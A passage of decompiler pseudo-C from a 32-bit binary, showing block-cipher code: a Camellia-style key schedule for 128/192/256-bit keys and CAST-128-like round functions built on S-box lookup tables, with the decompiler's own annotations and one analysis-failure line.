    v23 = *(_DWORD *)(a5 + 8 * (unsigned __int8)((v21 ^ (unsigned int)v42) >> 16) + 2048) ^ *(_DWORD *)(a5 + 8 * ((v21 ^ (unsigned int)v42) >> 24)) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)(v21 ^ v42) + 4) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)((unsigned __int16)(v21 ^ v42) >> 8) + 2052);
    v24 = *(_DWORD *)(a5 + 8 * BYTE2(v22) + 2052) ^ *(_DWORD *)(a5 + 8 * HIBYTE(v22) + 2048) ^ v23 ^ *(_DWORD *)(a5 + 8 * BYTE1(v22) + 4) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)v22);
    v25 = *(a6 - 8);
    v53 = v24 ^ v52 ^ __ROR4__(v23, 8);
    v49 = v48 ^ v24;
    v26 = *(a6 - 7) ^ v53;
    v27 = *(_DWORD *)(a5 + 8 * (unsigned __int8)((v25 ^ (unsigned int)v49) >> 16) + 2048) ^ *(_DWORD *)(a5 + 8 * ((v25 ^ (unsigned int)v49) >> 24)) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)(v25 ^ v49) + 4) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)((unsigned __int16)(v25 ^ v49) >> 8) + 2052);
    v28 = *(_DWORD *)(a5 + 8 * BYTE2(v26) + 2052) ^ *(_DWORD *)(a5 + 8 * HIBYTE(v26) + 2048) ^ v27 ^ *(_DWORD *)(a5 + 8 * BYTE1(v26) + 4) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)v26);
    v29 = *(a6 - 10);
    v46 = v28 ^ v45 ^ __ROR4__(v27, 8);
    v43 = v42 ^ v28;
    v30 = *(a6 - 9) ^ v46;
    v31 = *(_DWORD *)(a5 + 8 * (unsigned __int8)((v29 ^ (unsigned int)v43) >> 16) + 2048) ^ *(_DWORD *)(a5 + 8 * ((v29 ^ (unsigned int)v43) >> 24)) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)(v29 ^ v43) + 4) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)((unsigned __int16)(v29 ^ v43) >> 8) + 2052);
    v32 = *(_DWORD *)(a5 + 8 * BYTE2(v30) + 2052) ^ *(_DWORD *)(a5 + 8 * HIBYTE(v30) + 2048) ^ v31 ^ *(_DWORD *)(a5 + 8 * BYTE1(v30) + 4) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)v30);
    v33 = *(a6 - 12);
    v54 = v32 ^ v53 ^ __ROR4__(v31, 8);
    v50 = v49 ^ v32;
    v34 = *(a6 - 11) ^ v54;
    v35 = *(_DWORD *)(a5 + 8 * (unsigned __int8)((v33 ^ (unsigned int)v50) >> 16) + 2048) ^ *(_DWORD *)(a5 + 8 * ((v33 ^ (unsigned int)v50) >> 24)) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)(v33 ^ v50) + 4) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)((unsigned __int16)(v33 ^ v50) >> 8) + 2052);
    v36 = *(_DWORD *)(a5 + 8 * BYTE2(v34) + 2052) ^ *(_DWORD *)(a5 + 8 * HIBYTE(v34) + 2048) ^ v35 ^ *(_DWORD *)(a5 + 8 * BYTE1(v34) + 4) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)v34);
    v37 = *(a6 - 14);
    v38 = v36 ^ v46 ^ __ROR4__(v35, 8);
    v39 = v43 ^ v36;
    a6 -= 16;
    if ( a6 == a11 )
      break;
    v12 = __ROL4__(v39 & v37, 1) ^ v38;
    v44 = v12;
    v47 = v50 ^ (a6[1] | v54);
    v11 = (v12 | a6[3]) ^ v39;
    v41 = v11;
    v13 = *(a6 - 2);
  }
  return *a6 ^ v50;
}

//----- (004AE2E0) --------------------------------------------------------
int __cdecl sub_4AE2E0(int a1, unsigned int *a2, int *a3)
{
  int v3; // eax
  int v4; // ebx
  int v5; // ecx
  int v6; // edx
  unsigned int v7; // eax
  unsigned int v8; // ebx
  int v9; // ecx
  int v10; // edx
  unsigned __int32 v11; // eax
  unsigned __int32 v12; // ebx
  unsigned __int32 v13; // ecx
  unsigned __int32 v14; // edx
  int v15; // edx
  int v16; // ecx
  int v17; // ebx
  int v18; // eax
  int v19; // edx
  int v20; // ecx
  int v21; // ebx
  int v22; // eax
  int v23; // eax
  __int64 v24; // rcx
  unsigned int v25; // ebp
  int v26; // eax
  __int64 v27; // rcx
  int v28; // edx
  unsigned int v29; // ebp
  int v30; // eax
  int v31; // edx
  unsigned int v32; // ebp
  int v33; // eax
  int v34; // edx
  unsigned int v35; // ebp
  __int64 v36; // rax
  unsigned int v37; // ebp
  unsigned int v38; // ebp
  unsigned __int64 v39; // kr00_8
  unsigned int v40; // esi
  unsigned int v41; // ebp
  unsigned int v42; // ebp
  unsigned int v43; // ebp
  unsigned int v44; // ebp
  int v46; // edx
  int v47; // ecx
  int v48; // ebx
  int v49; // eax
  __int64 v50; // rcx
  int v51; // eax
  int v52; // edx
  unsigned int v53; // ebp
  __int64 v54; // rax
  unsigned int v55; // ebp
  unsigned __int64 v56; // kr08_8
  unsigned int v57; // esi
  unsigned int v58; // ebp
  unsigned int v59; // ebp
  unsigned __int64 v60; // kr10_8
  unsigned int v61; // esi
  unsigned int v62; // ebp
  unsigned __int64 v63; // kr18_8
  unsigned int v64; // esi
  unsigned int v65; // ebp
  int v66; // [esp+0h] [ebp-20h]
  int v67; // [esp+0h] [ebp-20h]
  int v68; // [esp+0h] [ebp-20h]
  unsigned int v69; // [esp+0h] [ebp-20h]
  int v70; // [esp+4h] [ebp-1Ch]
  int v71; // [esp+4h] [ebp-1Ch]
  int v72; // [esp+4h] [ebp-1Ch]
  int v73; // [esp+8h] [ebp-18h]
  int v74; // [esp+8h] [ebp-18h]
  int v75; // [esp+8h] [ebp-18h]
  int v76; // [esp+8h] [ebp-18h]
  int v77; // [esp+Ch] [ebp-14h]
  int v78; // [esp+Ch] [ebp-14h]
  int v79; // [esp+Ch] [ebp-14h]
  int v80; // [esp+Ch] [ebp-14h]

  v3 = _byteswap_ulong(*a2);
  v4 = _byteswap_ulong(a2[1]);
  v5 = _byteswap_ulong(a2[2]);
  v6 = _byteswap_ulong(a2[3]);
  *a3 = v3;
  a3[1] = v4;
  a3[2] = v5;
  a3[3] = v6;
  if ( a1 != 128 )
  {
    v7 = a2[4];
    v8 = a2[5];
    if ( a1 == 192 )
    {
      v9 = ~v7;
      v10 = ~v8;
    }
    else
    {
      v9 = a2[6];
      v10 = a2[7];
    }
    v11 = _byteswap_ulong(v7);
    v12 = _byteswap_ulong(v8);
    v13 = _byteswap_ulong(v9);
    v14 = _byteswap_ulong(v10);
    a3[8] = v11;
    a3[9] = v12;
    a3[10] = v13;
    a3[11] = v14;
    v3 = *a3 ^ v11;
    v4 = a3[1] ^ v12;
    v5 = a3[2] ^ v13;
    v6 = a3[3] ^ v14;
  }
  v66 = v3;
  v70 = v4;
  v73 = v5;
  v77 = v6;
  v15 = dword_4AF194[2 * (unsigned __int8)((v3 ^ 0xA09E667F) >> 16) + 219] ^ dword_4AED00[2 * ((v3 ^ 0xA09E667F) >> 24)] ^ dword_4AED00[2 * ((unsigned __int8)v3 ^ 0x7F) + 1] ^ dword_4AF194[2 * (unsigned __int8)((unsigned __int16)(v3 ^ 0x667F) >> 8) + 220];
  v16 = dword_4AF194[2 * (unsigned __int8)((v4 ^ 0x3BCC908Bu) >> 16) + 220] ^ dword_4AF194[2
                                                                                         * ((v4 ^ 0x3BCC908Bu) >> 24)
                                                                                         + 219] ^ v15 ^ dword_4AED00[2 * (unsigned __int8)((unsigned __int16)(v4 ^ 0x908B) >> 8) + 1] ^ dword_4AED00[2 * ((unsigned __int8)v4 ^ 0x8B)];
  v78 = v16 ^ v77 ^ __ROR4__(v15, 8);
  v74 = v73 ^ v16;
  v17 = dword_4AF194[2 * (unsigned __int8)((v74 ^ 0xB67AE858) >> 16) + 219] ^ dword_4AED00[2
                                                                                         * ((v74 ^ 0xB67AE858) >> 24)] ^ dword_4AED00[2 * ((unsigned __int8)v74 ^ 0x58) + 1] ^ dword_4AF194[2 * (unsigned __int8)((unsigned __int16)(v74 ^ 0xE858) >> 8) + 220];
  v18 = dword_4AF194[2 * (unsigned __int8)((v78 ^ 0x4CAA73B2u) >> 16) + 220] ^ dword_4AF194[2
                                                                                          * ((v78 ^ 0x4CAA73B2u) >> 24)
                                                                                          + 219] ^ v17 ^ dword_4AED00[2 * (unsigned __int8)((unsigned __int16)(v78 ^ 0x73B2) >> 8) + 1] ^ dword_4AED00[2 * ((unsigned __int8)v78 ^ 0xB2)];
  v67 = *a3 ^ v66 ^ v18;
  v71 = a3[1] ^ v18 ^ v70 ^ __ROR4__(v17, 8);
  v19 = dword_4AF194[2 * (unsigned __int8)((v67 ^ 0xC6EF372F) >> 16) + 219] ^ dword_4AED00[2
                                                                                         * ((v67 ^ 0xC6EF372F) >> 24)] ^ dword_4AED00[2 * ((unsigned __int8)v67 ^ 0x2F) + 1] ^ dword_4AF194[2 * (unsigned __int8)((unsigned __int16)(v67 ^ 0x372F) >> 8) + 220];
  v20 = dword_4AF194[2 * (unsigned __int8)((v71 ^ 0xE94F82BE) >> 16) + 220] ^ dword_4AF194[2
                                                                                         * ((v71 ^ 0xE94F82BE) >> 24)
                                                                                         + 219] ^ v19 ^ dword_4AED00[2 * (unsigned __int8)((unsigned __int16)(v71 ^ 0x82BE) >> 8) + 1] ^ dword_4AED00[2 * ((unsigned __int8)v71 ^ 0xBE)];
  v79 = v20 ^ a3[3] ^ v78 ^ __ROR4__(v19, 8);
  v75 = a3[2] ^ v74 ^ v20;
  v21 = dword_4AF194[2 * (unsigned __int8)((v75 ^ 0x54FF53A5u) >> 16) + 219] ^ dword_4AED00[2
                                                                                          * ((v75 ^ 0x54FF53A5u) >> 24)] ^ dword_4AED00[2 * ((unsigned __int8)v75 ^ 0xA5) + 1] ^ dword_4AF194[2 * (unsigned __int8)((unsigned __int16)(v75 ^ 0x53A5) >> 8) + 220];
  v22 = dword_4AF194[2 * (unsigned __int8)((v79 ^ 0xF1D36F1C) >> 16) + 220] ^ dword_4AF194[2
                                                                                         * ((v79 ^ 0xF1D36F1C) >> 24)
                                                                                         + 219] ^ v21 ^ dword_4AED00[2 * (unsigned __int8)((unsigned __int16)(v79 ^ 0x6F1C) >> 8) + 1] ^ dword_4AED00[2 * ((unsigned __int8)v79 ^ 0x1C)];
  HIDWORD(v24) = v22 ^ v71 ^ __ROR4__(v21, 8);
  v23 = v67 ^ v22;
  LODWORD(v24) = v75;
  if ( a1 == 128 )
  {
    a3[4] = v23;
    a3[5] = HIDWORD(v24);
    a3[6] = v75;
    a3[7] = v79;
    v25 = v23;
    v26 = (HIDWORD(v24) >> 17) | (v23 << 15);
    a3[12] = v26;
    HIDWORD(v27) = v24 >> 17;
    a3[13] = HIDWORD(v27);
    LODWORD(v27) = __SPAIR64__(v75, v79) >> 17;
    v28 = (v25 >> 17) | (v79 << 15);
    a3[14] = v27;
    a3[15] = v28;
    v29 = v26;
    v30 = (HIDWORD(v27) >> 17) | (v26 << 15);
    a3[16] = v30;
    HIDWORD(v27) = v27 >> 17;
    a3[17] = HIDWORD(v27);
    LODWORD(v27) = __SPAIR64__(__PAIR64__(v75, v79) >> 17, v28) >> 17;
    v31 = (v29 >> 17) | (v28 << 15);
    a3[18] = v27;
    a3[19] = v31;
    v32 = v30;
    v33 = (HIDWORD(v27) >> 17) | (v30 << 15);
    a3[24] = v33;
    HIDWORD(v27) = v27 >> 17;
    a3[25] = HIDWORD(v27);
    LODWORD(v27) = __SPAIR64__(v27, v31) >> 17;
    v34 = (v32 >> 17) | (v31 << 15);
    v35 = v33;
    LODWORD(v36) = (HIDWORD(v27) >> 17) | (v33 << 15);
    a3[28] = v36;
    HIDWORD(v27) = v27 >> 17;
    a3[29] = HIDWORD(v27);
    LODWORD(v27) = __SPAIR64__(v27, v34) >> 17;
    HIDWORD(v36) = (v35 >> 17) | (v34 << 15);
    a3[30] = v27;
    a3[31] = HIDWORD(v36);
    v37 = HIDWORD(v27);
    HIDWORD(v27) = v27 >> 30;
    a3[40] = HIDWORD(v27);
    LODWORD(v27) = __SPAIR64__(v27, HIDWORD(v36)) >> 30;
    a3[41] = v27;
    HIDWORD(v36) = v36 >> 30;
    LODWORD(v36) = (v37 >> 30) | (4 * v36);
    a3[42] = HIDWORD(v36);
    a3[43] = v36;
    a3[48] = v27 >> 15;
    a3[49] = __SPAIR64__(v27, HIDWORD(v36)) >> 15;
    a3[50] = v36 >> 15;
    a3[51] = (HIDWORD(v27) >> 15) | ((_DWORD)v36 << 17);
    LODWORD(v36) = a3[3];
    v38 = *a3;
    v39 = (unsigned __int64)(unsigned int)a3[1] << 15;
    HIDWORD(v27) = HIDWORD(v39) | (*a3 << 15);
    v40 = a3[2];
    a3[8] = HIDWORD(v27);
    LODWORD(v27) = (v40 >> 17) | v39;
    a3[9] = v27;
    HIDWORD(v36) = ((unsigned int)v36 >> 17) | (v40 << 15);
    LODWORD(v36) = (v38 >> 17) | ((_DWORD)v36 << 15);
    a3[10] = HIDWORD(v36);
    a3[11] = v36;
    v41 = HIDWORD(v27);
    HIDWORD(v27) = v27 >> 2;
    a3[20] = HIDWORD(v27);
    LODWORD(v27) = __SPAIR64__(v27, HIDWORD(v36)) >> 2;
    a3[21] = v27;
    HIDWORD(v36) = v36 >> 2;
    LODWORD(v36) = (v41 >> 2) | ((_DWORD)v36 << 30);
    a3[22] = HIDWORD(v36);
    a3[23] = v36;
    v42 = HIDWORD(v27);
    HIDWORD(v27) = v27 >> 17;
    LODWORD(v27) = __SPAIR64__(v27, HIDWORD(v36)) >> 17;
    HIDWORD(v36) = v36 >> 17;
    LODWORD(v36) = (v42 >> 17) | ((_DWORD)v36 << 15);
    a3[26] = HIDWORD(v36);
    a3[27] = v36;
    v43 = HIDWORD(v27);
    HIDWORD(v27) = v27 >> 15;
    a3[32] = HIDWORD(v27);
    LODWORD(v27) = __SPAIR64__(v27, HIDWORD(v36)) >> 15;
    a3[33] = v27;
    HIDWORD(v36) = v36 >> 15;
    LODWORD(v36) = (v43 >> 15) | ((_DWORD)v36 << 17);
    a3[34] = HIDWORD(v36);
    a3[35] = v36;
    v44 = HIDWORD(v27);
    HIDWORD(v27) = v27 >> 15;
    a3[36] = HIDWORD(v27);
    LODWORD(v27) = __SPAIR64__(v27, HIDWORD(v36)) >> 15;
    a3[37] = v27;
    HIDWORD(v36) = v36 >> 15;
    LODWORD(v36) = (v44 >> 15) | ((_DWORD)v36 << 17);
    a3[38] = HIDWORD(v36);
    a3[39] = v36;
    a3[44] = v27 >> 15;
    a3[45] = __SPAIR64__(v27, HIDWORD(v36)) >> 15;
    a3[46] = v36 >> 15;
    a3[47] = (HIDWORD(v27) >> 15) | ((_DWORD)v36 << 17);
    return 3;
  }
  else
  {
    a3[12] = v23;
    a3[13] = HIDWORD(v24);
    a3[14] = v75;
    a3[15] = v79;
    v68 = a3[8] ^ v23;
    v72 = a3[9] ^ HIDWORD(v24);
    v46 = dword_4AF194[2 * (unsigned __int8)((v68 ^ 0x10E527FAu) >> 16) + 219] ^ dword_4AED00[2
                                                                                            * ((v68 ^ 0x10E527FAu) >> 24)] ^ dword_4AED00[2 * ((unsigned __int8)v68 ^ 0xFA) + 1] ^ dword_4AF194[2 * (unsigned __int8)((unsigned __int16)(v68 ^ 0x27FA) >> 8) + 220];
    v47 = dword_4AF194[2 * (unsigned __int8)((v72 ^ 0xDE682D1D) >> 16) + 220] ^ dword_4AF194[2
                                                                                           * ((v72 ^ 0xDE682D1D) >> 24)
                                                                                           + 219] ^ v46 ^ dword_4AED00[2 * (unsigned __int8)((unsigned __int16)(v72 ^ 0x2D1D) >> 8) + 1] ^ dword_4AED00[2 * ((unsigned __int8)v72 ^ 0x1D)];
    v80 = v47 ^ a3[11] ^ v79 ^ __ROR4__(v46, 8);
    v76 = a3[10] ^ v75 ^ v47;
    v48 = dword_4AF194[2 * (unsigned __int8)((v76 ^ 0xB05688C2) >> 16) + 219] ^ dword_4AED00[2
                                                                                           * ((v76 ^ 0xB05688C2) >> 24)] ^ dword_4AED00[2 * ((unsigned __int8)v76 ^ 0xC2) + 1] ^ dword_4AF194[2 * (unsigned __int8)((unsigned __int16)(v76 ^ 0x88C2) >> 8) + 220];
    v49 = dword_4AF194[2 * (unsigned __int8)((v80 ^ 0xB3E6C1FD) >> 16) + 220] ^ dword_4AF194[2
                                                                                           * ((v80 ^ 0xB3E6C1FD) >> 24)
                                                                                           + 219] ^ v48 ^ dword_4AED00[2 * (unsigned __int8)((unsigned __int16)(v80 ^ 0xC1FD) >> 8) + 1] ^ dword_4AED00[2 * ((unsigned __int8)v80 ^ 0xFD)];
    HIDWORD(v50) = v49 ^ v72 ^ __ROR4__(v48, 8);
    v69 = v68 ^ v49;
    LODWORD(v50) = v76;
    a3[4] = v69;
    a3[5] = HIDWORD(v50);
    a3[6] = v76;
    a3[7] = v80;
    v51 = (HIDWORD(v50) >> 2) | (v69 << 30);
    a3[20] = v51;
    HIDWORD(v50) = v50 >> 2;
    a3[21] = HIDWORD(v50);
    LODWORD(v50) = __SPAIR64__(v76, v80) >> 2;
    v52 = (v69 >> 2) | (v80 << 30);
    a3[22] = v50;
    a3[23] = v52;
    v53 = v51;
    LODWORD(v54) = (HIDWORD(v50) >> 2) | (v51 << 30);
    a3[40] = v54;
    HIDWORD(v50) = v50 >> 2;
    a3[41] = HIDWORD(v50);
    LODWORD(v50) = (__int64)((__PAIR64__(v76, v80) << 30) | (v69 >> 2)) >> 2;
    HIDWORD(v54) = (v53 >> 2) | (v52 << 30);
    a3[42] = v50;
    a3[43] = HIDWORD(v54);
    a3[64] = v50 >> 13;
    a3[65] = __SPAIR64__(((__PAIR64__(v76, v80) << 30) | (v69 >> 2)) >> 2, HIDWORD(v54)) >> 13;
    a3[66] = v54 >> 13;
    a3[67] = (HIDWORD(v50) >> 13) | ((_DWORD)v54 << 19);
    LODWORD(v54) = a3[11];
    v55 = a3[8];
    v56 = (unsigned __int64)(unsigned int)a3[9] << 15;
    HIDWORD(v50) = HIDWORD(v56) | (v55 << 15);
    v57 = a3[10];
    a3[8] = HIDWORD(v50);
    LODWORD(v50) = (v57 >> 17) | v56;
    a3[9] = v50;
    HIDWORD(v54) = ((unsigned int)v54 >> 17) | (v57 << 15);
    LODWORD(v54) = (v55 >> 17) | ((_DWORD)v54 << 15);
    a3[10] = HIDWORD(v54);
    a3[11] = v54;
    HIDWORD(v50) = v50 >> 17;
    a3[16] = HIDWORD(v50);
    LODWORD(v50) = __SPAIR64__(v50, HIDWORD(v54)) >> 17;
    a3[17] = v50;
    HIDWORD(v54) = v54 >> 17;
    LODWORD(v54) = ((HIDWORD(v56) | (v55 << 15)) >> 17) | ((_DWORD)v54 << 15);
    a3[18] = HIDWORD(v54);
    a3[19] = v54;
    v58 = HIDWORD(v50);
    HIDWORD(v50) = v50 >> 2;
    a3[36] = HIDWORD(v50);
    LODWORD(v50) = __SPAIR64__(v50, HIDWORD(v54)) >> 2;
    a3[37] = v50;
    HIDWORD(v54) = v54 >> 2;
    LODWORD(v54) = (v58 >> 2) | ((_DWORD)v54 << 30);
    a3[38] = HIDWORD(v54);
    a3[39] = v54;
    a3[52] = __SPAIR64__(v50, HIDWORD(v54)) >> 30;
    a3[53] = v54 >> 30;
    a3[54] = (HIDWORD(v50) >> 30) | (4 * v54);
    a3[55] = v50 >> 30;
    HIDWORD(v50) = a3[15];
    v59 = a3[12];
    v60 = (unsigned __int64)(unsigned int)a3[13] << 15;
    LODWORD(v50) = HIDWORD(v60) | (v59 << 15);
    v61 = a3[14];
    a3[12] = v50;
    HIDWORD(v54) = (v61 >> 17) | v60;
    a3[13] = HIDWORD(v54);
    LODWORD(v54) = (HIDWORD(v50) >> 17) | (v61 << 15);
    HIDWORD(v50) = (v59 >> 17) | (HIDWORD(v50) << 15);
    a3[14] = v54;
    a3[15] = HIDWORD(v50);
    LODWORD(v50) = __SPAIR64__(v50, HIDWORD(v54)) >> 2;
    a3[28] = v50;
    HIDWORD(v54) = v54 >> 2;
    a3[29] = HIDWORD(v54);
    LODWORD(v54) = (HIDWORD(v50) >> 2) | ((_DWORD)v54 << 30);
    HIDWORD(v50) = ((HIDWORD(v60) | (v59 << 15)) >> 2) | (HIDWORD(v50) << 30);
    a3[30] = v54;
    a3[31] = HIDWORD(v50);
    a3[48] = HIDWORD(v54);
    a3[49] = v54;
    a3[50] = HIDWORD(v50);
    a3[51] = v50;
    a3[56] = v54 >> 15;
    a3[57] = (HIDWORD(v50) >> 15) | ((_DWORD)v54 << 17);
    a3[58] = v50 >> 15;
    a3[59] = __SPAIR64__(v50, HIDWORD(v54)) >> 15;
    HIDWORD(v54) = *a3;
    v62 = a3[1];
    v63 = (unsigned __int64)(unsigned int)a3[2] << 13;
    LODWORD(v54) = HIDWORD(v63) | (v62 << 13);
    v64 = a3[3];
    a3[24] = v54;
    HIDWORD(v50) = (v64 >> 19) | v63;
    a3[25] = HIDWORD(v50);
    LODWORD(v50) = (HIDWORD(v54) >> 19) | (v64 << 13);
    HIDWORD(v54) = (v62 >> 19) | (HIDWORD(v54) << 13);
    a3[26] = v50;
    a3[27] = HIDWORD(v54);
    LODWORD(v54) = (HIDWORD(v50) >> 17) | ((_DWORD)v54 << 15);
    a3[32] = v54;
    HIDWORD(v50) = v50 >> 17;
    a3[33] = HIDWORD(v50);
    LODWORD(v50) = __SPAIR64__(v50, HIDWORD(v54)) >> 17;
    HIDWORD(v54) = ((HIDWORD(v63) | (v62 << 13)) >> 17) | (HIDWORD(v54) << 15);
    a3[34] = v50;
    a3[35] = HIDWORD(v54);
    v65 = v54;
    LODWORD(v54) = (HIDWORD(v50) >> 15) | ((_DWORD)v54 << 17);
    a3[44] = v54;
    HIDWORD(v50) = v50 >> 15;
    a3[45] = HIDWORD(v50);
    LODWORD(v50) = __SPAIR64__(v50, HIDWORD(v54)) >> 15;
    HIDWORD(v54) = (v65 >> 15) | (HIDWORD(v54) << 17);
    a3[46] = v50;
    a3[47] = HIDWORD(v54);
    a3[60] = v50 >> 30;
    a3[61] = __SPAIR64__(v50, HIDWORD(v54)) >> 30;
    a3[62] = v54 >> 30;
    a3[63] = (HIDWORD(v50) >> 30) | (4 * v54);
    return 4;
  }
}
// 4AED00: using guessed type int[148];
// 4AF194: using guessed type int[512];

//----- (004AEC60) --------------------------------------------------------
int __cdecl sub_4AEC60(unsigned int *a1, int a2, int *a3)
{
  int result; // eax
  int v4; // eax
  int *v5; // edx

  result = -1;
  if ( a1 )
  {
    if ( a3 )
    {
      result = -2;
      if ( a2 == 256 || a2 == 192 || a2 == 128 )
      {
        v4 = sub_4AE2E0(a2, a1, a3);
        *v5 = v4;
        return 0;
      }
    }
  }
  return result;
}
// 4AECB7: variable 'v5' is possibly undefined

//----- (004AFD00) --------------------------------------------------------
#error "4AFFA2: call analysis failed (funcsize=261)"

//----- (004B0070) --------------------------------------------------------
int __cdecl sub_4B0070(int *a1, int a2)
{
  int result; // eax
  int v3; // esi
  unsigned int v4; // edi
  int v5; // edx
  unsigned int v6; // edi
  int v7; // esi
  unsigned int v8; // edi
  int v9; // edx
  unsigned int v10; // edi
  int v11; // esi
  unsigned int v12; // edi
  int v13; // edx
  unsigned int v14; // edi
  int v15; // esi
  unsigned int v16; // edi
  int v17; // edx
  unsigned int v18; // edi
  int v19; // esi
  unsigned int v20; // edi
  int v21; // edx
  unsigned int v22; // edi
  int v23; // esi
  unsigned int v24; // edi
  int v25; // edx
  unsigned int v26; // edi
  int v27; // esi
  unsigned int v28; // edi
  int v29; // edx
  unsigned int v30; // edi
  int v31; // esi
  unsigned int v32; // edi
  unsigned int v33; // edi

  result = a2;
  v3 = a1[1];
  v4 = __ROL4__(v3 + *(_DWORD *)a2, *(_BYTE *)(a2 + 4));
  v5 = *a1 ^ (dword_5263E0[BYTE2(v4)]
            + (dword_525BE0[(unsigned __int8)v4] ^ dword_5257E0[BYTE1(v4)])
            - dword_525FE0[HIBYTE(v4)]);
  v6 = __ROL4__(v5 ^ *(_DWORD *)(a2 + 8), *(_BYTE *)(a2 + 12));
  v7 = dword_5263E0[BYTE2(v6)] ^ (dword_525FE0[HIBYTE(v6)] + dword_5257E0[BYTE1(v6)] - dword_525BE0[(unsigned __int8)v6]) ^ v3;
  v8 = __ROL4__(*(_DWORD *)(a2 + 16) - v7, *(_BYTE *)(a2 + 20));
  v9 = ((dword_525FE0[HIBYTE(v8)] ^ (dword_525BE0[(unsigned __int8)v8] + dword_5257E0[BYTE1(v8)]))
      - dword_5263E0[BYTE2(v8)]) ^ v5;
  v10 = __ROL4__(v9 + *(_DWORD *)(a2 + 24), *(_BYTE *)(a2 + 28));
  v11 = (dword_5263E0[BYTE2(v10)]
       + (dword_525BE0[(unsigned __int8)v10] ^ dword_5257E0[BYTE1(v10)])
       - dword_525FE0[HIBYTE(v10)]) ^ v7;
  v12 = __ROL4__(v11 ^ *(_DWORD *)(a2 + 32), *(_BYTE *)(a2 + 36));
  v13 = dword_5263E0[BYTE2(v12)] ^ (dword_525FE0[HIBYTE(v12)]
                                  + dword_5257E0[BYTE1(v12)]
                                  - dword_525BE0[(unsigned __int8)v12]) ^ v9;
  v14 = __ROL4__(*(_DWORD *)(a2 + 40) - v13, *(_BYTE *)(a2 + 44));
  v15 = ((dword_525FE0[HIBYTE(v14)] ^ (dword_525BE0[(unsigned __int8)v14] + dword_5257E0[BYTE1(v14)]))
       - dword_5263E0[BYTE2(v14)]) ^ v11;
  v16 = __ROL4__(v15 + *(_DWORD *)(a2 + 48), *(_BYTE *)(a2 + 52));
  v17 = (dword_5263E0[BYTE2(v16)]
       + (dword_525BE0[(unsigned __int8)v16] ^ dword_5257E0[BYTE1(v16)])
       - dword_525FE0[HIBYTE(v16)]) ^ v13;
  v18 = __ROL4__(v17 ^ *(_DWORD *)(a2 + 56), *(_BYTE *)(a2 + 60));
  v19 = dword_5263E0[BYTE2(v18)] ^ (dword_525FE0[HIBYTE(v18)]
                                  + dword_5257E0[BYTE1(v18)]
                                  - dword_525BE0[(unsigned __int8)v18]) ^ v15;
  v20 = __ROL4__(*(_DWORD *)(a2 + 64) - v19, *(_BYTE *)(a2 + 68));
  v21 = ((dword_525FE0[HIBYTE(v20)] ^ (dword_525BE0[(unsigned __int8)v20] + dword_5257E0[BYTE1(v20)]))
       - dword_5263E0[BYTE2(v20)]) ^ v17;
  v22 = __ROL4__(v21 + *(_DWORD *)(a2 + 72), *(_BYTE *)(a2 + 76));
  v23 = (dword_5263E0[BYTE2(v22)]
       + (dword_525BE0[(unsigned __int8)v22] ^ dword_5257E0[BYTE1(v22)])
       - dword_525FE0[HIBYTE(v22)]) ^ v19;
  v24 = __ROL4__(v23 ^ *(_DWORD *)(a2 + 80), *(_BYTE *)(a2 + 84));
  v25 = dword_5263E0[BYTE2(v24)] ^ (dword_525FE0[HIBYTE(v24)]
                                  + dword_5257E0[BYTE1(v24)]
                                  - dword_525BE0[(unsigned __int8)v24]) ^ v21;
  v26 = __ROL4__(*(_DWORD *)(a2 + 88) - v25, *(_BYTE *)(a2 + 92));
  v27 = ((dword_525FE0[HIBYTE(v26)] ^ (dword_525BE0[(unsigned __int8)v26] + dword_5257E0[BYTE1(v26)]))
       - dword_5263E0[BYTE2(v26)]) ^ v23;
  if ( !*(_DWORD *)(a2 + 128) )
  {
    v28 = __ROL4__(v27 + *(_DWORD *)(a2 + 96), *(_BYTE *)(a2 + 100));
    v29 = (dword_5263E0[BYTE2(v28)]
         + (dword_525BE0[(unsigned __int8)v28] ^ dword_5257E0[BYTE1(v28)])
         - dword_525FE0[HIBYTE(v28)]) ^ v25;
    v30 = __ROL4__(v29 ^ *(_DWORD *)(a2 + 104), *(_BYTE *)(a2 + 108));
    v31 = dword_5263E0[BYTE2(v30)] ^ (dword_525FE0[HIBYTE(v30)]
                                    + dword_5257E0[BYTE1(v30)]
                                    - dword_525BE0[(unsigned __int8)v30]) ^ v27;
    v32 = __ROL4__(*(_DWORD *)(a2 + 112) - v31, *(_BYTE *)(a2 + 116));
    v25 = ((dword_525FE0[HIBYTE(v32)] ^ (dword_525BE0[(unsigned __int8)v32] + dword_5257E0[BYTE1(v32)]))
         - dword_5263E0[BYTE2(v32)]) ^ v29;
    v33 = __ROL4__(v25 + *(_DWORD *)(a2 + 120), *(_BYTE *)(a2 + 124));
    result = dword_5263E0[BYTE2(v33)]
           + (dword_525BE0[(unsigned __int8)v33] ^ dword_5257E0[BYTE1(v33)])
           - dword_525FE0[HIBYTE(v33)];
    v27 = result ^ v31;
  }
  *a1 = v27;
  a1[1] = v25;
  return result;
}
// 5257E0: using guessed type int dword_5257E0[256];
// 525BE0: using guessed type int dword_525BE0[256];
// 525FE0: using guessed type int dword_525FE0[256];
// 5263E0: using guessed type int dword_5263E0[256];

//----- (004B0540) --------------------------------------------------------
int __cdecl sub_4B0540(int *a1, int a2)
{
  int v2; // edx
  int v3; // esi
  unsigned int v4; // edi
  int v5; // edx
  unsigned int v6; // edi
  int v7; // esi
  unsigned int v8; // edi
  unsigned int v9; // edi
  unsigned int v10; // edi
  int v11; // edx
  unsigned int v12; // edi
  int v13; // esi
  unsigned int v14; // edi
  int v15; // edx
  unsigned int v16; // edi
  int v17; // esi
  unsigned int v18; // edi
  int v19; // edx
  unsigned int v20; // edi
  int v21; // esi
  unsigned int v22; // edi
  int v23; // edx
  unsigned int v24; // edi
  int v25; // esi
  unsigned int v26; // edi
  int v27; // edx
  unsigned int v28; // edi
  int v29; // esi
  unsigned int v30; // edi
  int v31; // edx
  unsigned int v32; // edi
  int result; // eax

  v2 = *a1;
  v3 = a1[1];
